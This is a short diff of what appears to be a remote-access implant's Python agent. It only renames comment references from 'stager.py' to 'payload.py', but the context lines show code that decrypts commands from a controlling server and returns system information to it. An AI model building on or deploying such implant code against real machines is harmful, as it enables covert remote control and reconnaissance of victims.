@@ -70,7 +70,7 @@ _meta_cache = {}
 
 
 # global header dictionary
-#   sessionID is set by stager.py
+#   sessionID is set by payload.py
 # headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}
 headers = {'User-Agent': userAgent}
 
@@ -199,7 +199,7 @@ def process_tasking(data):
     #   -extracts the packets and processes each
 
     try:
-        # aes_decrypt_and_verify is in stager.py
+        # aes_decrypt_and_verify is in payload.py
         tasking = aes_decrypt_and_verify(key, data)
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
         
@@ -255,7 +255,7 @@ def process_packet(packetType, data, resultID):
 
     if packetType == 1:
         # sysinfo request
-        # get_sysinfo should be exposed from stager.py
+        # get_sysinfo should be exposed from payload.py
         return build_response_packet(1, get_sysinfo(), resultID)
 
     elif packetType == 2:
